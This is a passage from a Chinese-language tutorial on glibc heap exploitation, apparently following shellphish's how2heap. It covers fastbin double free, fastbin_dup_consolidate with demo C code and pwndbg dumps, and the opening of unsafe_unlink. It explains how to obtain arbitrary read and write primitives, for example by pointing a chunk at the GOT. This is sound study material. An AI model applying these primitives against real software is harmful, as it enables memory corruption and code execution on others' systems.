    0x20: 0x603000 —▸ 0x7fffffffe388 —▸ 0x603010 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
这个时候形成如上的链表结构，这个时候当我们再 malloc 一块内存的时候，系统会误以为 是我们 fake 的chunk是free的。他会把这块 chunk
拿出来用。
    Pwndbg> heap
    Top Chunk: 0x603060
    Last Remainder: 0
    0x603000 FASTBIN {
      prev_size = 0x0,
      size = 0x21,
      fd = 0x7fffffffe388,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x603020 FASTBIN {
      prev_size = 0x0,
      size = 0x21,
      fd = 0x603000,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
小结：对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got
地址，如果我们可对 chunk 进行写或者读操作，我们就有了任意地址写 和 任意地址读。
### 0x04 fastbin_dup_consolidate
我们上一条 0x02 介绍了一个 fast double free 的绕过机制，通过在free 同一个 chunk中的中间插入对另外一个chunk
的free。
    free(p1);
    free(p2);
    free(p1);
这里 shellphish 向我们展示了 large bin 中 mallo_consolidata 机制 fast 对double free 的检查
    #include 
    #include 
    #include 
    int main() {
      void* p1 = malloc(0x40);
      void* p2 = malloc(0x40);
      fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
      fprintf(stderr, "Now free p1!\n");
      free(p1);
      void* p3 = malloc(0x400);
      fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
      fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
      free(p1);
      fprintf(stderr, "Trigger the double free vulnerability!\n");
      fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
      fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
    }
同样的编译后 gdb 挂载运行。
首先是两个malloc
    Pwndbg> heap
    Top Chunk: 0x6020a0
    Last Remainder: 0
    0x602000 FASTBIN {
      prev_size = 0x0,
      size = 0x51,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 FASTBIN {
      prev_size = 0x0,
      size = 0x51,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6020a0 PREV_INUSE {
      prev_size = 0x0,
      size = 0x20f61,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后释放 p 1,讲他加入到 fastbins中
    Pwndbg> fastbins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x602000 ◂— 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    Pwndbg> heap
当我们在中插入 `malloc(0x400)` 创建一个 large bins的时候。
* * *
large bins
chunk 的指针数组, 每个元素是一条 双向循环链表的头部, 但同一条链表中块的大小不一 定相同, 按照从大到小的顺序排列, 每个 bin 保存一定
大小范围的块。主要保存大小 1024 字节以上的块。
* * *
    Pwndbg> fastbins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    Pwndbg> small bins
    No symbol "bins" in current context.
    smallbins
    0x20: 0x7ffff7dd1b68 (main_arena+104) ◂— 0x7ffff7dd1b68
    0x30: 0x7ffff7dd1b78 (main_arena+120) ◂— 0x7ffff7dd1b78
    0x40: 0x7ffff7dd1b88 (main_arena+136) ◂— 0x7ffff7dd1b88
    0x50: 0x602000 —▸ 0x7ffff7dd1b98 (main_arena+152) ◂— 0x602000
我们会发现 原本在 fastbins 的 chunk p1 跑到了 small bins 里。而且 chunk p2 的prev_size
和size字段都被修改了
    Pwndbg> heap
    Top Chunk: 0x6024b0
    Last Remainder: 0
    0x602000 FASTBIN {
      prev_size = 0x0,
      size = 0x51,
      fd = 0x7ffff7dd1b98 ,
      bk = 0x7ffff7dd1b98 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 {
      prev_size = 0x50,
      size = 0x50,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6020a0 PREV_INUSE {
      prev_size = 0x0,
      size = 0x411,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6024b0 PREV_INUSE {
      prev_size = 0x0,
      size = 0x20b51,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
我们可以看看 large bin的分配
    /*
         If this is a large request, consolidate fastbins before continuing.
         While it might look excessive to kill all fastbins before
         even seeing if there is space available, this avoids
         fragmentation problems normally associated with fastbins.
         Also, in practice, programs tend to have runs of either small or
         large requests, but less often mixtures, so consolidation is not
         invoked all that often in most programs. And the programs that
         it is called frequently in otherwise tend to fragment.
       */
      else
        {
          idx = largebin_index (nb);
          if (have_fastchunks (av))
            malloc_consolidate (av);
        }
当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins
中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk
加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回
small bins 或 large bins 中。这个时候我们就可以再次释放 p1
    Pwndbg> fastbins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x602000 ◂— 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    Pwndbg> smallbins
    smallbins
    0x20: 0x7ffff7dd1b68 (main_arena+104) ◂— 0x7ffff7dd1b68
    0x30: 0x7ffff7dd1b78 (main_arena+120) ◂— 0x7ffff7dd1b78
    0x40: 0x7ffff7dd1b88 (main_arena+136) ◂— 0x7ffff7dd1b88
    0x50: 0x602000 ◂— 0x0
这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk
p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。
    Allocated two fastbins: p1=0x220a010 p2=0x220a060
    Now free p1!
    Allocated large bin to trigger malloc_consolidate(): p3=0x220a0b0
    In malloc_consolidate(), p1 is moved to the unsorted bin.
    Trigger the double free vulnerability!
    We can pass the check in malloc() since p1 is not fast top.
    Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x220a010 0x220a010
### 0x05 unsafe_unlink
Exploiting free on a corrupted chunk to get arbitrary write.
利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即 unsafe unlink。
首先我们创建两个chunk 分别为chunk_0 和chunk_1
    Pwndbg> x/40gx 0x603000-0x10
    0x602ff0:   0x0000000000000000  0x0000000000000000
    0x603000:   0x0000000000000000  0x0000000000000091            <- chunk 0
    0x603020:   0x0000000000000000  0x0000000000000000
    0x603030:   0x0000000000000000  0x0000000000000000
    0x603040:   0x0000000000000000  0x0000000000000000
    0x603050:   0x0000000000000000  0x0000000000000000
    0x603060:   0x0000000000000000  0x0000000000000000
    0x603070:   0x0000000000000000  0x0000000000000000
    0x603080:   0x0000000000000000  0x0000000000000000
    0x603090:   0x0000000000000000  0x0000000000000091            <- chunk 1
    0x6030a0:   0x0000000000000000  0x0000000000000000
    0x6030b0:   0x0000000000000000  0x0000000000000000
    0x6030c0:   0x0000000000000000  0x0000000000000000